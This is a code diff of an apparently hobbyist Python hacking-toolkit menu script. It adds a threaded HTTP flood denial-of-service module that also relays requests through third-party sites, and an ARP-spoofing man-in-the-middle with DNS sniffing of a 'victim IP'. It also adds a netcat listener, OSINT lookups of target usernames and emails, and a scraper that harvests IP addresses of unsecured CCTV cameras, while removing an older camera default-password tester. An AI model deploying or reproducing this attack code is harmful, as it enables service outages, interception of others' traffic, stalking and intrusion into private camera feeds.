-                threads = []
-        
-        # Check ONVIF streams
-        if port in streaming_ports['onvif']:
-            url = f"http://{ip}:{port}/onvif/device_service"
-            thread = threading.Thread(target=lambda u=url: check_stream_with_details(u) or None)
-            thread.daemon = True
-            threads.append(thread)
-            thread.start()
-            found_streams = True
-            
-            if len(threads) >= max_concurrent:
-                for t in threads:
-                    t.join()
-                threads = []
-    
-    # Wait for remaining threads
-    for thread in threads:
-        thread.join()
-    
-    if not found_streams:
-        print("  ❌ No live streams detected")
+
+
+    except KeyboardInterrupt:
+        close_program()
+
+
+
+########################################### OSINT ##########################################################
+
+
+def setup(tool):
+    if is_command_available(tool) and tool in tools:
+        tools[tool]()
     else:
-        print(f"  📊 Stream detection completed")
+        if not is_command_available("pipx"):
+            if check_distro() == "debian_based":
+                os.system("sudo apt install pipx")
+            elif check_distro() == "arch_based":
+                os.system("sudo pacman -S pipx")
+            elif check_distro() == "fedora_based":
+                os.system("sudo dnf install pipx")
+        else:
+            print("\n")
+            os.system(f"pipx install {tools_install[tool]}")
+            tools[tool]()
+
+
+def sherlock():
+    # Fatto
+    menu_intro("Sherlock Osint Tool")
+    s = input(f"{Fore.GREEN} Username > {Style.RESET_ALL}")
+    print("\n")
+    os.system(f"sherlock {s}")
+    ask_next_action(sherlock, osint, "OSINT")
+
+
+def maigret():
+    # Fatto
+    menu_intro("Maigret Osint Tool")
+    s = input(f"{Fore.GREEN} Username > {Style.RESET_ALL}")
+    os.system(f"maigret {s}")
+    ask_next_action(maigret, osint, "OSINT")
+
+
+def socialscan():
+    # Fatto
+    menu_intro("SocialScan Osint Tool")
+    s = input(f"{Fore.GREEN} Username > {Style.RESET_ALL}")
+    os.system(f"socialscan {s}")
+    ask_next_action(socialscan, osint, "OSINT")
+
+
+def holehe():
+    menu_intro("Holehe Tool")
+    email = input(f"{Fore.GREEN} Email > {Style.RESET_ALL}")
+    os.system(f"holehe {email}")
+    ask_next_action(holehe, osint, "OSINT")
+
+
+
+def ghunt():
+    config_path = os.path.expanduser("~/.config/ghunt/config.json")
+    
+    menu_intro("GHunt Tool")
+    os.system("ghunt login")
+    ask_next_action(ghunt, osint, "OSINT")
+
+
+def toutatis():
+    # Fatto
+    menu_intro("Toutatis Tool")
+    session_id = input(f"{Fore.GREEN} your session_id > {Style.RESET_ALL}")
+    target = input(f"{Fore.GREEN} target username > {Style.RESET_ALL}")
+    os.system(f"toutatis -s {session_id} -u {target}")
+    ask_next_action(toutatis, osint, "OSINT")
+
+
+def instaloader():
+    # non fatto
+    menu_intro("Instaloader Tool")
+    username = input(f"{Fore.GREEN} Your Username > {Style.RESET_ALL}")
+    os.system(f"instaloader --login={username}")
+    ask_next_action(instaloader, osint, "OSINT")
+
+
+tools = {
+    "maigret": maigret,
+    "sherlock": sherlock,
+    "socialscan": socialscan,
+    "holehe": holehe,
+    #"ghunt": ghunt,
+    "toutatis": toutatis,
+    #"instaloader": instaloader
+}
+
+tools_install = {
+    "sherlock": "sherlock-project",
+    "maigret": "maigret",
+    "socialscan": "socialscan",
+    "holehe": "holehe",
+    "ghunt": "GHunt",
+    "toutatis": "toutatis",
+    "instaloader": "instaloader"
+}
+
+
+# Still in development guys :')
+def osint():
+    try:
+        menu_intro("OSINT")
+        
+        text_animation(f"{Fore.RED}[!] This section is still in development...{Style.RESET_ALL}", 0.01)
+        time.sleep(3)
+        main()
+
+        s = input(f"{Fore.GREEN} root@{username}/OSINT:~$ {Style.RESET_ALL}")
+
+        match s:
+            case "0":
+                return main()
+            case "1":
+                setup("sherlock")
+            case "2":
+                setup("maigret")
+            case "5":
+                setup("socialscan")
+            case "6":
+                setup("toutatis")
+            case "8":
+                setup("instaloader")
+            case "11":
+                setup("holehe")
+            case "13":
+                setup("ghunt")
+
+        #if s not in ["1", "2", "5", "6", "8", "11", "13"]:
+        #    text_animation(f"\n{Fore.RED}[!] This section is still in development...{Style.RESET_ALL}", 0.01)
+        #    time.sleep(3)
+        #    osint()
+        
+        text_animation(f"\n{Fore.RED}[!] This section is still in development...{Style.RESET_ALL}", 0.01)
+        time.sleep(3)
+        main()
+
+    except KeyboardInterrupt:
+        close_program()
+
+
+
+
+################################# DOS ATTACK ##############################################
+
+def dos():
+    try:
+        clear()
+
+        text_animation(title, 0.0005)
+
+        def load_user_agents():
+            global uagent
+            uagent = [
+                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
+                "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0",
+                "Mozilla/5.0 (X11; Linux x86_64; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
+                "Mozilla/5.0 (Windows; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
+                "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7",
+                "Mozilla/5.0 (Windows; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
+                "Mozilla/5.0 (Windows; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1"
+            ]
+
+        def load_bots():
+            global bots
+            bots = [
+                "http://validator.w3.org/check?uri=",
+                "http://www.facebook.com/sharer/sharer.php?u="
+            ]
+
+        def bot_attack(url):
+            try:
+                while True:
+                    req = urllib.request.Request(url, headers={'User-Agent': random.choice(uagent)})
+                    urllib.request.urlopen(req)
+                    print("\033[94m [Bot] Sending indirect attack request...\033[0m")
+                    time.sleep(0.1)
+            except:
+                time.sleep(0.1)
+
+        def direct_attack(item):
+            try:
+                while True:
+                    packet = str(f"GET / HTTP/1.1\nHost: {host}\n\nUser-Agent: {random.choice(uagent)}\n{data}").encode('utf-8')
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.connect((host, int(port)))
+                    if s.sendto(packet, (host, int(port))):
+                        s.shutdown(socket.SHUT_WR)
+                        print(f"\033[92m[{time.ctime()}] Packet sent successfully\033[0m \033[94m<-- HaxL0p4 packet -->\033[0m")
+                    else:
+                        print("\033[91m Connection closed unexpectedly\033[0m")
+                    time.sleep(0.1)
+            except socket.error:
+                print("\033[91m [!] Connection error! Target may be down.\033[0m")
+                time.sleep(0.1)
+
+        def attack_thread():
+            while True:
+                item = q.get()
+                direct_attack(item)
+                q.task_done()
+
+        def bot_thread():
+            while True:
+                item = w.get()
+                bot_attack(random.choice(bots) + "http://" + host)
+                w.task_done()
+
+        def get_user_input():
+            global host, port, threads
+
+            host = input(f"{Fore.GREEN}{Style.BRIGHT}> {Fore.CYAN}[+] Enter Target URL: {Style.RESET_ALL}")
+            port = input(f"{Fore.GREEN}{Style.BRIGHT}> {Fore.CYAN}[+] Enter target port (default 80): {Style.RESET_ALL}") or "80"
+            threads = input(f"{Fore.GREEN}{Style.BRIGHT}> {Fore.CYAN}[+] Enter number of threads (default 135): {Style.RESET_ALL}") or "135"
+
+
+            print(f"\n\033[92mTarget: {host} | Port: {port} | Threads: {threads}\033[0m")
+            text_animation("\033[94mPreparing attack...\033[0m\n", 0.03)
+
+        # Queues for threading
+        q = Queue()
+        w = Queue()
+
+        # Read headers
+        with open(".files/headers.txt", "r") as headers:
+            global data
+            data = headers.read()
+
+        get_user_input()
+        load_user_agents()
+        load_bots()
+
+        # Test connection
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((host, int(port)))
+            s.settimeout(1)
+        except socket.error:
+            print("\033[91m [!] Could not connect to the target. Check host/port.\033[0m")
+            sys.exit()
+
+        # Start threads
+        for _ in range(int(threads)):
+            t = threading.Thread(target=attack_thread)
+            t.daemon = True
+            t.start()
+            t2 = threading.Thread(target=bot_thread)
+            t2.daemon = True
+            t2.start()
+
+        # Task queue
+        item = 0
+        while True:
+            if item > 1800:
+                item = 0
+                time.sleep(0.1)
+            item += 1
+            q.put(item)
+            w.put(item)
+
+        q.join()
+        w.join()
+
+    except KeyboardInterrupt:
+        close_program()
+
+########################################## END DOS ATTACK ###################################################
+
+def netcat_listener():
+    try:
+        clear()
+
+        text_animation(title, 0.0005)
+        port = input(f"\n{Fore.YELLOW}Port: {Style.RESET_ALL}")
+        text_animation(f"\n{Fore.YELLOW}CTRL+C for return to menu...{Style.RESET_ALL}\n", 0.02)
+        try:
+            subprocess.run(["nc", "-lvp", port])
+        except KeyboardInterrupt:
+            text_animation(f"\n {Fore.RED}[!] Connection Closed... Return to main menu...{Style.RESET_ALL}", 0.02)
+            time.sleep(1)
+            main()
+    except KeyboardInterrupt:
+        close_program()
+
+
+def network():
+    try:
+        menu_intro("Network")
+
+        print(f" {Fore.CYAN}[{Fore.WHITE}1{Fore.CYAN}] Network Scanner")
+        print(f" [{Fore.WHITE}2{Fore.CYAN}] Port Scanner")
+        print(f" [{Fore.WHITE}3{Fore.CYAN}] Web Spy")
+        print(f" [{Fore.WHITE}4{Fore.CYAN}] Netcat Listener")
+        print(f"\n [{Style.RESET_ALL}{Fore.RED}0{Fore.CYAN}] Menu{Style.RESET_ALL}")
+
+        choice = input(f"{Fore.GREEN} root@{username}/network:~$ {Style.RESET_ALL}")
+
+        match (choice):
+            case "1":
+                net_scan()
+            case "2":
+                port_scanner()
+            case "3":
+                web_spoof()
+            case "4":
+                netcat_listener()
+            case "0":
+                main()
+    except KeyboardInterrupt:
+        close_program()
+
+
+def net_scan():
+    try:
+        text_animation(f"\n{Fore.RED}[*] Scanning local network using ARP...{Style.RESET_ALL}", 0.02)
+        print("\n")
+        os.system("sudo arp-scan -l")
+    except KeyboardInterrupt:
+        close_program()
+
+    
+    ask_next_action(net_scan, network, "Network")   
+
+
+
+def get_main_domain(domain):
+    parts = domain.split(".")
+    if len(parts) >= 2:
+        return ".".join(parts[-2:])
+    return domain
+
+def enable_promiscuous(iface):
+    os.system(f"sudo ip link set {iface} promisc on")
+
+def arp_spoof(victim_ip, gateway_ip, iface):
+    conf.iface = iface
+
+    victim_mac = getmacbyip(victim_ip)
+    gateway_mac = getmacbyip(gateway_ip)
+
+    if not victim_mac or not gateway_mac:
+        print(f"{Fore.RED}[!] Impossibile ottenere gli indirizzi MAC. Controlla la connessione di rete.{Style.RESET_ALL}")
+        return
+
+    pkt_to_victim = Ether(dst=victim_mac)/ARP(op=2, pdst=victim_ip, psrc=gateway_ip, hwdst=victim_mac)
+    pkt_to_gateway = Ether(dst=gateway_mac)/ARP(op=2, pdst=gateway_ip, psrc=victim_ip, hwdst=gateway_mac)
+
+    print(f"{Fore.CYAN}[*] Starting ARP spoofing (MITM)...{Style.RESET_ALL}")
+    try:
+        while True:
+            sendp(pkt_to_victim, iface=iface, verbose=False)
+            sendp(pkt_to_gateway, iface=iface, verbose=False)
+            time.sleep(2)
+    except KeyboardInterrupt:
+        print(f"\n{Fore.RED}[!] ARP spoofing stopped.{Style.RESET_ALL}")
+
+def dns_sniffer(iface, target_ip=""):
+    def process_packet(packet):
+        if packet.haslayer(DNSQR) and packet.haslayer(IP):
+            if not target_ip or packet[IP].src == target_ip:
+                try:
+                    domain = packet[DNSQR].qname.decode('utf-8').strip('.')
+                    main_domain = get_main_domain(domain)  
+                    print(f"{Fore.GREEN}[+] {packet[IP].src} requested: {main_domain}{Style.RESET_ALL}")  
+                except Exception as e:
+                    print(f"{Fore.RED}[-] Error decoding DNS request: {e}{Style.RESET_ALL}")
+    sniff(filter=f"udp port 53 and src {target_ip}", iface=iface, prn=process_packet, store=False)
+
+def web_spoof():
+    try:
+        iface = input(f"\n{Fore.YELLOW} Interface (e.g., wlan0): {Style.RESET_ALL}")
+        victim_ip = input(f"{Fore.YELLOW} Victim IP > {Style.RESET_ALL}")
+        gateway_ip = input(f"{Fore.YELLOW} Gateway IP > {Style.RESET_ALL}")
+
+        enable_promiscuous(iface)
+
+        os.system("sudo sysctl -w net.ipv4.ip_forward=1")
+        os.system(f"sudo iptables -t nat -A POSTROUTING -o {iface} -j MASQUERADE")
+
+        spoof_thread = threading.Thread(target=arp_spoof, args=(victim_ip, gateway_ip, iface), daemon=True)
+        spoof_thread.start()
+
+        print(f"{Fore.CYAN}\n[*] Sniffing DNS traffic from {victim_ip} on {iface}... Press Ctrl+C to stop.{Style.RESET_ALL}")
+        try:
+            dns_sniffer(iface, victim_ip)
+        except KeyboardInterrupt:
+            print(f"\n{Fore.RED}[!] Sniffing stopped.{Style.RESET_ALL}")
+    except KeyboardInterrupt:
+        print(f"\n{Fore.RED}[!] Interrupted by user.{Style.RESET_ALL}")
+
+
+
+
+def get_public_ip():
+    r = requests.get("https://api.ipify.org")
+    return r.text
+
+
+def ip_geo():
+    try:
+        menu_intro("IP GEOLOCATOR")
+
+        public_ip = get_public_ip()
+        print(f" Your ip address: {Fore.RED}{public_ip}{Style.RESET_ALL}")
+        print(f'\n Type "{Fore.RED}0{Style.RESET_ALL}" for return back')
+
+        target_ip = input(f"{Fore.RED} TARGET IP: {Style.RESET_ALL}")
+
+        if target_ip == "0":
+            main()
+        
+        request_url = 'https://geolocation-db.com/jsonp/' + target_ip
+        response = requests.get(request_url)
+        result = response.content.decode()
+        result = result.split("(")[1].strip(")")
+        result = json.loads(result)
+
+        print("\n Geolocation Information:")
+        print(f" Country Code: {Fore.YELLOW}{result['country_code']}{Style.RESET_ALL}")
+        print(f" Country Name: {Fore.YELLOW}{result['country_name']}{Style.RESET_ALL}")
+        print(f" City: {Fore.YELLOW}{result['city']}{Style.RESET_ALL}")
+        print(f" Postal Code: {Fore.RED}{result['postal']}{Style.RESET_ALL}")
+        print(f" Latitude: {Fore.CYAN}{result['latitude']}{Style.RESET_ALL}")
+        print(f" Longitude: {Fore.CYAN}{result['longitude']}{Style.RESET_ALL}")
+        print(f" IPv4 Address: {Fore.GREEN}{result['IPv4']}{Style.RESET_ALL}")
+        print(f" State: {Fore.GREEN}{result['state']}{Style.RESET_ALL}")
+
+        back = input(f"\n{Fore.RED} [❔] Back Y/N: {Style.RESET_ALL}")
+
+        if back.lower() == "y":
+            main()
+        elif back.lower() == "n":
+            sys.exit()
+        else:
+            print("Option Not Valid...")
+    except KeyboardInterrupt:
+        close_program()
+
+
+def typewriter(text, delay=0.02):
+    for char in text:
+        sys.stdout.write(char)
+        sys.stdout.flush()
+        time.sleep(delay)
+    print()
+
+
+
+def banner():
+    clear()
+    print("\033[1;32m")
+    print(" ▄████▄   ▄████▄  ▄▄▄█████▓ ██▒   █▓")
+    print("▒██▀ ▀█  ▒██▀ ▀█  ▓  ██▒ ▓▒▓██░   █▒")
+    print("▒▓█    ▄ ▒▓█    ▄ ▒ ▓██░ ▒░ ▓██  █▒░")
+    print("▒▓▓▄ ▄██▒▒▓▓▄ ▄██▒░ ▓██▓ ░   ▒██ █░░")
+    print("▒ ▓███▀ ░▒ ▓███▀ ░  ▒██▒ ░    ▒▀█░  ")
+    print("░ ░▒ ▒  ░░ ░▒ ▒  ░  ▒ ░░      ░ ▐░  ")
+    print("░  ▒     ░  ▒       ░       ░ ░░    ")
+    print("░        ░          ░           ░░  ")
+    print("░ ░      ░ ░                     ░  ")
+    print("░        ░                      ░   ")
+    print("         \033[1;37mCreated by \033[1;31mL0pa 💻\033[0m\n")
+    typewriter("\033[1;36m[~] Initializing access to unsecured CCTV feeds...\033[0m", 0.03)
+
+def CCTV():
+    try:
+        banner()
+        url = "http://www.insecam.org/en/jsoncountries/"
+        headers = CaseInsensitiveDict()
+        headers["Accept"] = "*/*"
+        headers["User-Agent"] = "Mozilla/5.0 (X11; Linux x86_64)"
+
+        country = None
+        try:
+            typewriter("\033[1;34m[+] Retrieving country codes...\033[0m", 0.02)
+            resp = requests.get(url, headers=headers)
+
+            try:
+                data = resp.json()
+                countries = data.get('countries', {})
+            except Exception:
+                print("\033[1;33m[!] Warning: Could not parse JSON. Falling back to legacy mode...\033[0m")
+                countries = {}
+
+            if not countries:
+                print("\033[1;33m[!] Could not load country list. Enter code manually.\033[0m")
+            else:
+                print("\n\033[1;32m=== Available Country Codes ===\033[0m")
+                for key, value in countries.items():
+                    print(f'\033[1;36mCode: ({key}) - {value["country"]} ({value["count"]})\033[0m')
+                print(f"\n{Fore.CYAN}[{Fore.RED}0{Fore.CYAN}] {Fore.LIGHTRED_EX}Menu                                      {Fore.GREEN}")
+
+            print("")
+            country = input("\033[1;33m[?] Enter country code (e.g. JP, RU, US): \033[0m").strip().upper()
+
+            if country == "0": main()
+
+            typewriter(f"\033[1;34m[+] Scanning feeds in region: {country}...\033[0m", 0.03)
+            res = requests.get(f"http://www.insecam.org/en/bycountry/{country}", headers=headers)
+            last_page = re.findall(r'pagenavigator\("\?page=", (\d+)', res.text)
+            last_page = int(last_page[0]) if last_page else 1
+
+
+            os.makedirs("cams", exist_ok=True)
+            with open(f'cams/{country}.txt', 'w') as f:
+                for page in range(last_page):
+                    res = requests.get(
+                        f"http://www.insecam.org/en/bycountry/{country}/?page={page}",
+                        headers=headers
+                    )
+                    find_ip = re.findall(r"http://\d+\.\d+\.\d+\.\d+:\d+", res.text)
+                    for ip in find_ip:
+                        print(f"\033[1;31m[+] Found cam: {ip}\033[0m")
+                        f.write(f'{ip}\n')
+                        time.sleep(0.05)
+
+        except Exception as e:
+            print(f"\033[1;31m[!] Error during execution: {e}\033[0m")
+
+        finally:
+            if country:
+                print(f"\n\033[1;32m[✓] Feeds saved to file: \033[1;37m{country}.txt\033[0m")
+            else:
+                print("\033[1;33m[~] No feeds saved due to earlier error.\033[0m")
+            print("\033[1;30m[>] Exiting session...\033[0m")
+            time.sleep(1)
+            exit()
+    except KeyboardInterrupt:
+        main()
+
+
+
+def update_lopa_toolkit():
+    text_animation(f"\n{Fore.YELLOW}[+] Starting Upgrade...{Style.RESET_ALL}", 0.02)
+    try:
+        subprocess.run("git stash && git pull", shell=True, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
+        main()
+    except subprocess.CalledProcessError:
+        text_animation(f"\n{Fore.RED}[-] Error During The Update!...{Style.RESET_ALL}\n", 0.02)
+
 
 def main():
-    global threads_running
     try:
-        target_ip = input(f"{G}[+] {C}Enter IP CCTV / IP ADDRESS: {W}").strip()
-        if not validate_ip(target_ip):
-            return
-        
-        print(BANNER)
-        print('____________________________________________________________________________\n')
-        
-        print_search_urls(target_ip)
-        google_dork_search(target_ip)
-        get_ip_location_info(target_ip)
-        
-        open_ports = check_ports(target_ip)
-        if open_ports:
-            camera_found = check_if_camera(target_ip, open_ports)
-            if not camera_found:
-                choice = input("\n[❓] No camera found. Do you still want to check login pages, vulnerabilities, and passwords? [y/N]: ").strip().lower()
-                if choice != "y":
-                    print("\n[✅] Scan Completed! No camera found.")
-                    return
-            check_login_pages(target_ip, open_ports)
-            fingerprint_camera(target_ip, open_ports)
-            test_default_passwords(target_ip, open_ports)
-            detect_live_streams(target_ip, open_ports)
-        else:
-            print("\n[❌] No open ports found. Likely no camera here.")
-        print("\n[✅] Scan Completed!")
-        
-    except KeyboardInterrupt:
-        print("\n[!] Scan aborted by user")
-        threads_running = False
-        sys.exit(1)
+        if os.name == "nt":
+            windows()
+            
+        clear()
+        text_animation(title, 0.0005)
 
-if __name__ == "__main__":
-    main()
+        text_animation(f"                                \033[1;37mCreated by \033[1;31mDanxy 💻\033[0m\n", 0.0005)
+        text_animation(f"{Fore.CYAN} \t\t\t\tTikTok: {Style.RESET_ALL}{Fore.LIGHTBLUE_EX}@qwela.38\n{Style.RESET_ALL}", 0.0005)
+
+        menu = f"""
+            {Fore.GREEN}{Style.BRIGHT}┌{'─'*50}┐
+            │{Fore.MAGENTA}{Style.BRIGHT}             DANXY TOOLS - MAIN MENU         {Fore.GREEN}     │
+            ├{'─'*50}┤
+            │ {Fore.CYAN}[{Fore.WHITE}1{Fore.CYAN}] {Fore.LIGHTGREEN_EX}CCTV Cam's                              {Fore.GREEN}     │
+            │ {Fore.CYAN}[{Fore.RED}0{Fore.CYAN}] {Fore.LIGHTRED_EX}Exit                                      {Fore.GREEN}   │
+            └{'─'*50}┘
+        """
+        print(menu)
+        s = input(f"{Fore.GREEN} root@{username}:~$ {Style.RESET_ALL}")
+
+        match s:
+            case "1":
+                CCTV()
+            case "0":
+                close_program()
+            case _:
+                print(f"{Fore.RED}Invalid input.{Style.RESET_ALL}")
+                main()
+
+    except KeyboardInterrupt:
+        close_program()
+
+
+if __name__ == '__main__':
+    main()  
